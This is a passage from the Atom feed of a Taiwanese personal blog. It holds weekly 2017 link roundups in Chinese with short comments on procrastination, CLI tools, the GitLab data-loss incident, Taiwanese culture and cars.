&lt;li&gt;例如：原本打算打掃房間，結果爸媽突然把房門打開一看，覺得房間超級髒亂，叫你趕快整理，但就因為這樣，原本想整理房間的念頭就取消了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;上面這三項我除了帳單不會拖到最後一天才繳以外，其他根本全部中槍。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=KAsCepna4aY"&gt;為什麼我老是愛拖延?(下) | 啾來聊聊2015 | 第14集 | 啾啾鞋 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;拖延者最大的迷思就是「以為事情愈少就容易愈有效率的完成」  &lt;ul&gt;
&lt;li&gt;所以常常講出「我今天就是要專心完成這一件事」，但其實心裡就是會拖著這件事情不想去做。  &lt;/li&gt;
&lt;li&gt;因為已經把事情簡化到只有一件事了，所以在沒有其他事情可以選擇的情況下，就會開始找些無關緊要的事情來做，倒是耍廢了一整天，然後根本什麼事情也沒做。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「結構式拖延」  &lt;ul&gt;
&lt;li&gt;結構式拖延就是在增加拖延者在拖延一件事時，可以找哪些其他事情來做的選擇，避免自己選擇一些無關緊要的事情來做。  &lt;/li&gt;
&lt;li&gt;把拖延當成是一種心態，而不是一個病，所以不需與其逆勢的抵抗，而是順勢而為，利用拖延症本身的特性，訂定一個拖延者專屬的工作流程。  &lt;/li&gt;
&lt;li&gt;利用拖延症本身的特性，把一件不是非常緊急也沒那麼容易完成的事放在待辦清單的第一項，把其他重要緊急的事放在第二項。  &lt;/li&gt;
&lt;li&gt;拖延症患者常常會拖延待辦清單上第一項，然後找些無關緊要的事情來完成，這時候就可以往第二項以後開始找。  &lt;/li&gt;
&lt;li&gt;以至於雖然還是拖延症患者，但在拖延待辦清單上第一項事情的過程中，卻完成了更多重要的事情。  &lt;/li&gt;
&lt;li&gt;這樣就不會因為拖著一件事情沒做，而去找一些很沒意義的事情來做，導致自己覺得自己很廢甚至對自己反感的惡性循環中。  &lt;/li&gt;
&lt;li&gt;要你自己騙自己，誇大第一項待辦事項的重要性和緊急性（但其實沒那麼重要和緊急），這時候就會激發拖延者的本性，不停拖延第一件事然後瘋狂得找待辦清單第二項以後的事情來做。  &lt;ul&gt;
&lt;li&gt;因為第一項真的沒那麼緊急，所以雖然在拖延中緩慢進展直到很久以後才完成也無傷大雅，反而是在拖延這件事了期間完成了無數重要的事情）  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;其實實際在做這件事情的時候，我覺得最難的是決定到底要把哪件事情擺在第一項。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這個清單比較偏向多天以上的待辦清單  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;將非常簡單容易達成的事情列在每天的待辦清單上  &lt;ul&gt;
&lt;li&gt;例如：起床、不要按貪睡、不要賴床、刷牙、洗臉、等等這種小到不能再小的屁事  &lt;/li&gt;
&lt;li&gt;利用自己騙自己的心態讓自己覺得今天才剛開始沒多久就完成了很多事，然後非常豪氣的把那些待辦事項從清單上劃掉，進而覺得很爽的感覺。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「任務檢傷分類」  &lt;ul&gt;
&lt;li&gt;依照事情的輕重緩急，在接到事情的當下就決定這件事是要做到「完美」還是「夠好」就好。  &lt;/li&gt;
&lt;li&gt;用來克服上面提到的非適應型完美主義  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Procrastination"></category></entry><entry><title>Y2017W05</title><link href="https://blog.m157q.tw/posts/2017/02/06/y2017w05/" rel="alternate"></link><published>2017-02-06T22:43:10+08:00</published><updated>2017-02-06T22:43:10+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-02-06:posts/2017/02/06/y2017w05/</id><summary type="html">&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rg3/youtube-dl/tree/master/youtube_dl/extractor"&gt;youtube-dl/youtube_dl/extractor at master · rg3/youtube-dl · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來 youtube-dl 支援 600 多種網站...  &lt;/li&gt;
&lt;li&gt;開源大法就是好！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ggreer/the_silver_searcher"&gt;GitHub - ggreer/the_silver_searcher: A code-searching tool similar to ack, but faster.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Do you know C? Want to improve ag? I invite you to pair with me.  Ag is quite stable now. Most changes are new features, minor bug fixes, or performance improvements. It's much faster than Ack in my benchmarks:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;一個效能還不錯的程式碼搜尋工具  &lt;/li&gt;
&lt;li&gt;實際上用起來是要使用 &lt;code&gt;ag&lt;/code&gt; 這個指令  &lt;/li&gt;
&lt;li&gt;參考自 &lt;code&gt;ack&lt;/code&gt; 這個工具，不過效能比它好，而且實際用過兩款之後，我也比較喜歡 &lt;code&gt;ag&lt;/code&gt; 顯示資訊的方式。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ithome.com.tw/news/111133"&gt;Google Cloud新增金鑰管理服務，美、日、台測試上線 | iThome&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;不知道好不好用就是，在 GCP 上用 IAM 開一堆金鑰的感覺就是開了一堆金鑰用到後來都不知道能不能刪掉，管理起來很雜亂。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2309-introducing-topics"&gt;Introducing Topics&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Discover networks of similar repositories in a completely new way with Topics. Topics are labels that create subject-based connections between GitHub repositories and let you explore projects by type, technology, and more.  Click on a topic that interests you to find related repositories.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;GitHub 的 repo 現在可以加上 hashtag 啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;gitlab&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;應該是這週最多人分享的 IT 界新聞了吧，原本是要在 slave 機器上刪除東西，卻不小心在 master 機器上下了 &lt;code&gt;rm -rf&lt;/code&gt;，等到意識到的時候已經來不及了，5 種備份機制因為各種不同的原因都無法奏效，GitLab 還開實況直播搶救的過程。  &lt;/li&gt;
&lt;li&gt;也看到很多人又重新探討了資料備援的最佳實踐  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://about.gitlab.com/2017/02/01/gitlab-dot-com-database-incident/"&gt;GitLab.com Database Incident | GitLab&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/yftzeng.tw/posts/10206382658284710"&gt;《 檢查備份日：每年的 2 月 1 日 》... - Ant Yi-Feng Tzeng&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wanqu.co/a/4622/2017-02-02-gitlab-com-database-incident.html"&gt;GitLab 员工误删数据库、永久性丢失6小时数据的总结与反省 | 湾区日报&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;多起事件环环相扣，致命一击：工程师晚上11点还在工作，有点疲劳了，删除数据文件夹1、2秒后猛然惊醒，删错机器了，那是 db1！试了5种不同备份恢复机制，没一个有效的；只好痛失6小时数据。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/17680.html"&gt;从Gitlab误删除数据库想到的 | | 酷 壳 - CoolShell&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ro31337/libretaxi"&gt;GitHub - ro31337/libretaxi: LibreTaxi, free and open source Uber/Lyft alternative to connect passengers and drivers.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;LibreTaxi makes taxi affordable again by completely removing all layers in between. Passengers pay with cash and get connected with drivers directly, where LibreTaxi is a thin layer allowing to negotiate the price before order is confirmed. No registration/approval is required. Less regulations.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;類似 Uber 和 Lyft 的工具，但是不用透過任何公司，讓乘客和司機直接交易，不過目前似乎只有支援 Telegram 就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.daftcode.pl/hype-driven-development-3469fc2e9b22"&gt;Hype Driven Development&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Software development teams often make decisions about software architecture or technological stack based on inaccurate opinions, social media, and in general on what is considered to be “hot”, rather than solid research and any serious consideration of expected impact on their projects.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;這篇文章也很多人分享，主要就是在諷刺很多寫程式的人都是一窩蜂的使用什麼技術，或是去參加個 conference 或 meetup 看到人家說什麼好用就一股腦的用，也不想想到底適不適合，很開心的重造一堆輪子或是把原本好好的東西砍掉重練。  &lt;/li&gt;
&lt;li&gt;繁中翻譯版：&lt;a href="https://blog.chunfuchao.com/?p=656&amp;amp;variant=zh-tw"&gt;一窩蜂驅動開發 – Northern Wind&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;簡中翻譯版：&lt;a href="http://mp.weixin.qq.com/s/zHM9zgug_DpHv5KpR5zf3Q"&gt;哪個技術火就選哪個？切記知乎驅動的技術選型不靠譜！&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ascii-iicsa.blogspot.com/2017/02/blog-post.html"&gt;程序員筆記: 中階技術團隊管理的經驗分享&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是一篇很棒的管理階層經驗談，主要也是在談軟體工程師的工作態度就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wallabag.org/en"&gt;Save the web, freely | wallabag: a self hostable application for saving web pages&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;類似 pocket 的服務  &lt;/li&gt;
&lt;li&gt;差別是開源和 self-hosted  &lt;/li&gt;
&lt;li&gt;如果不想自己架要用官方架的要付費  &lt;/li&gt;
&lt;li&gt;有 Android / iOS App, Chrome, Firefox, Opera plugin  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/wallabag/wallabag"&gt;GitHub - wallabag/wallabag: wallabag is a self hostable application for saving web pages.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/soimort/you-get"&gt;soimort/you-get: Dumb downloader that scrapes the web&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;聽說是個可以補足 &lt;code&gt;youtube-dl&lt;/code&gt; 不足的部份的工具。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;car&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/car/M.1397029480.A.A28.html"&gt;[整理] 百萬左右熱門新車主被動安全配備(SRS/ESP/VSC..)整理 - 看板 car - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇的整理真的很棒呀，鄉民蒐集資訊的功力真的不容小覷。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/hong.shengcar/blog/64416181"&gt;什麼是ABS、EBD、ASR、ESP？... @ blog :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;車子真的也是一堆縮寫啊，不查都不知道是什麼東西，所以就查了一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.digitaltrends.com/cars/whats-the-difference-between-four-wheel-drive-and-all-wheel-drive/"&gt;4WD vs. AWD | The Differences Explained | Digital Trends&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;傳統四輪傳動跟全時四輪傳動的差別  &lt;/li&gt;
&lt;li&gt;主要就是需不需要手動切換吧，AWD 是透過電腦去控制。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/kaobegroup/posts/1359117310818592"&gt;嘴炮出版社 - 朋友對著緊盯著電視瞧的孩子大罵： 「就只知道看電視，讀書都沒這麼認真過！」 我在一旁酸他：... | Facebook&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「有趣的是，這些老了的賤人當初也是被上一代用著聖人的標準要求著，一代一代推算後發現，原來這樣的教育會讓小聖人都成了老賤人。」  &lt;/li&gt;
&lt;li&gt;最常得到的回應是「你再頂嘴？是不是皮在癢？」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=zXsBSwJUDEo"&gt;書來面對 EP1《如何閱讀一本書》How to Read a Book - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個影片真的很棒呢，希望自己也能這樣閱讀啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://anthropologysediq.blogspot.tw/2014/02/29.html"&gt;喵比豹談人文: 「29暝」的秘密&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;這篇文章的發想來自一個小問題－不知道你有沒有想過？  今年農曆的最後一天是十二月三十日，也就是說，按照華語（Mandarin Chinese）的思維，農曆的「除夕夜」應該就是在三十號的晚上。可是呢，台語卻是把「除夕夜」叫做  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;原來是和地震有關啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%AD%9A%E7%AF%A5"&gt;篳篥 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;筚篥，也写做“觱篥”，名称可能是由突厥语或匈奴语直接音译过来。以竹或木做管，顶端有用芦苇或麦秸做的簧片，管身开洞，竖吹。声音高亢凄厉。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;篳ㄅㄧˋbì 篥ㄌㄧˋlì&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="car"></category><category term="cli"></category><category term="gcp"></category><category term="github"></category><category term="gitlab"></category><category term="misc"></category><category term="opensource"></category><category term="programmer"></category><category term="taiwan"></category><category term="trivia"></category><category term="web"></category></entry><entry><title>Y2017W04</title><link href="https://blog.m157q.tw/posts/2017/01/30/y2017w04/" rel="alternate"></link><published>2017-02-06T22:17:17+08:00</published><updated>2017-02-06T22:17:17+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-30:posts/2017/01/30/y2017w04/</id><summary type="html">&lt;h3&gt;beacon&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=TaCX29Fp9eA"&gt;Eddystone vs iBeacon: The Big Beacon Battle 2016 | Pulsate Academy - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;第一次聽到 Eddystone，看來比 iBeacon 好？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/01/linux-diff-url-standard-input-2017/"&gt;Linux 對「網址」、「標準輸入」做 Diff - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;both local  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat foo1.txt | diff foo2 -&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;one local, one remote  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;curl -s http://example.com/foo1 | diff foo2 -&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;both remote  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;diff &amp;lt;(curl -s http://example.com/foo1) &amp;lt;(curl -s http://example.com/foo2)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;diff &amp;lt;(ssh \"cat foo1") &amp;lt;(cat foo2) # 所以想要做 ssh 遠端比對也可以&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/01/08/7068/%e8%99%9f%e7%a8%b1%e7%9b%ae%e5%89%8d%e6%9c%80%e5%bf%ab%e7%9a%84-terminal-%e8%bb%9f%e9%ab%94-%e5%9b%a0%e7%82%ba%e7%94%a8-gpu-%e5%8a%a0%e9%80%9f/"&gt;號稱目前最快的 Terminal 軟體 (因為用 GPU 加速) | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.jwilm.io/announcing-alacritty/"&gt;http://blog.jwilm.io/announcing-alacritty/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jwilm/alacritty"&gt;https://github.com/jwilm/alacritty&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/g0v/itaigi"&gt;g0v/itaigi: 新台語·運動&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://itaigi.tw/"&gt;iTaigi 愛台語&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這網站挺棒的耶  &lt;/li&gt;
&lt;li&gt;結果仔細一看發現是 g0v 其中一個 project XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1483578056.A.A2A.html"&gt;[討論] Pub/Sub vs Observer Pattern - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哇塞 先不論討論結果如何  &lt;/li&gt;
&lt;li&gt;這應該算是這個版少數的優質文章吧  &lt;/li&gt;
&lt;li&gt;平常好多都慘不忍睹  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/pinkoi-engineering/%E5%88%A9%E7%94%A8-inspect-%E6%A8%A1%E7%B5%84%E5%9C%A8-python-%E5%BF%AB%E9%80%9F%E9%99%A4%E9%8C%AF-3b3462cbd775"&gt;利用 inspect 模組在 Python 快速除錯 – Pinkoi Engineering – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;大家可能很熟悉 Chrome 的開發人員工具（右鍵、Inspect），但同時也可能漏了這個在 Python 中有著一樣名字的模組—— inspect。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;看來除了 &lt;code&gt;pdb&lt;/code&gt; 以外，也得好好熟悉一下 &lt;code&gt;inspect&lt;/code&gt; 這個 module 啊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pwnable.tw"&gt;pwnable.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Pwnable.tw is a wargame site for hackers to test and expand their exploiting skills.  First 100 registered users will get an achievement!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;繼 &lt;a href="http://pwnable.kr"&gt;http://pwnable.kr&lt;/a&gt; 之後，台灣也有個 &lt;a href="https://pwnable.tw"&gt;https://pwnable.tw&lt;/a&gt; 啦  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2017/01/08/7070/%e5%88%a9%e7%94%a8%e9%9a%b1%e8%97%8f%e7%9a%84-form-input-%e5%8a%a0%e4%b8%8a%e8%87%aa%e5%8b%95%e5%ae%8c%e6%88%90%e5%8a%9f%e8%83%bd%e5%8f%96%e5%be%97%e6%95%8f%e6%84%9f%e8%b3%87%e6%96%99/"&gt;利用隱藏的 form input 加上自動完成功能取得敏感資料 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;還好我都沒在用 Autofill 的功能，原來可以這樣就拿到資料。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=mxAyxxVscwo&amp;amp;list=PLzlt9nxVmI3tt4i5Am7nSyi0Tn2krLLay&amp;amp;index=1"&gt;台灣諺語-心歹無人知 嘴歹上厲害 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哈哈哈 華視這系列的台灣諺語好棒啊  &lt;/li&gt;
&lt;li&gt;總共有 291 個影片  &lt;/li&gt;
&lt;li&gt;每個大概一分鐘左右而已  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://musou.tw/videos/1314"&gt;沃草國會無雙 | 沃草國會無雙&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;影片簡介 採訪：薛翰駿/影音：陳東總統府於1月22日召開全國年金改革國是會議，大批退休與現役軍公教人員也到凱道上抗議蔡英文政府要推行的年金改革，沃草街訪了幾位參加者，希望了解他們的對於這波改革的想法；為什  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=mxAyxxVscwo&amp;amp;list=PLzlt9nxVmI3tt4i5Am7nSyi0Tn2krLLay"&gt;台灣諺語-心歹無人知 嘴歹上厲害 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;【更多新聞詳情請上 http://news.cts.com.tw/ 華視新聞】  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=2RwA7uldITU"&gt;台灣諺語-無米 兼閏月 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;每週一到週五下午16:30，華視在地新聞！http://localnews.blog.cts.com.tw/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://itaigi.tw/"&gt;iTaigi 愛台語&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;很棒的網站呀，結果仔細看了一下才發現竟然是 g0v 的其中一個專案，而且連 commit message 都用台文寫。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;detention&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.facebook.com/nagee.tw/photos/a.10151409298917312.1073741829.353390642311/10154087960442312/?type=3"&gt;nagee - Timeline&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;nagee 的《返校》心得文，也是篇很棒的文章啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;taiwa&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1485095999.A.EDD.html"&gt;[爆卦] 年金是什麼？改革是在改什麼？ - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://digitalculturist.com/drowning-in-a-sea-of-information-563a3160efbb"&gt;Drowning in a Sea of Information&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Information overload is something that’s been plaguing me for a while. It was only recently that I decided to take the time to understand why my brain doesn’t work the way it used to. I needed to do this to understand myself.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;活在資訊爆炸的年代，浪費太多時間在接收沒那麼必要的資訊以及被打斷寶貴的專注力。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/man/car/D63A/D8A1/M.1210173555.A.13B.html"&gt;Re: [問題] 請問一下自排車的一些問題 - 精華區 car - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一些對於自排車檔位的小知識，駕訓班跟駕照筆試也不會講這個啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="beacon"></category><category term="cli"></category><category term="github"></category><category term="life"></category><category term="misc"></category><category term="ptt"></category><category term="python"></category><category term="security"></category><category term="taiwa"></category><category term="taiwan"></category><category term="web"></category></entry><entry><title>Y2017W03</title><link href="https://blog.m157q.tw/posts/2017/01/23/y2017w03/" rel="alternate"></link><published>2017-02-06T17:20:34+08:00</published><updated>2017-02-06T17:20:34+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2017-01-23:posts/2017/01/23/y2017w03/</id><summary type="html">&lt;h3&gt;algorithm&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://research.googleblog.com/2016/11/enhance-raisr-sharp-images-with-machine.html"&gt;Research Blog: Enhance! RAISR Sharp Images with Machine Learning&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;啊 原來這演算法去年 11 月就出來了啊  &lt;/li&gt;
&lt;li&gt;Google 利用人工智慧讓圖片可以用更少的容量就顯示更高的解析度，目前會先在 Google+ 試用，之後視情況再慢慢用到其他服務上。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/abs/1606.01299"&gt;RAISR: Rapid and Accurate Image Super-Resolution&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thecodist.com/article/25-ways-to-make-your-software-development-more-awesomely-crappy"&gt;The Codist: 25 Ways To Make Your Software Development More Awesomely Crappy!&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近好像很多這種反指標文  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;cli&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.longwin.com.tw/2017/01/linux-cli-stat-find-file-time-2017/"&gt;Linux 使用 stat 查詢檔案詳細的建立、修改時間 - Tsung's Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;stat $file&lt;/code&gt; or &lt;code&gt;stat $dir&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;git&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lolcommits.github.io/"&gt;lolcommits: selfies for software developers&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The single most useful piece of software known to mankind.  Animate your progress through a project and watch as you age. See what you looked like when you broke the build. Keep a joint lolrepository for your entire company.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
